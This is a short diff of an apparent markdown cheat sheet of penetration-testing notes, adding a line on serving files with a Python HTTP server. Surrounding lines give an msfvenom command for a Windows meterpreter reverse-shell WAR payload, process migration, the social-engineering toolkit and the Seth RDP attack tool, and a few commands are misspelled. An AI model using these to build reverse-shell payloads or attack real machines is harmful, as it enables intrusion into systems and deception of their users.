@@ -58,8 +58,7 @@ msfvenom -p windows/meterpreter/reverce_tcp -f war > file.war
 in here after `-p` we must add our platform and payload type and after `-f` add format and after `>` name the file.
 
 for changing process you can use `migrate`.
-
-
+with `python3 -m http.srever [port]` you can make a server in your directory
 for social engineering you can use `setoolkit` but remember you must be **root**.
 for remoting desktop you must use `seth`. you can clone it from [here](https://github.com/SySS-Research/Seth)
 ### sql
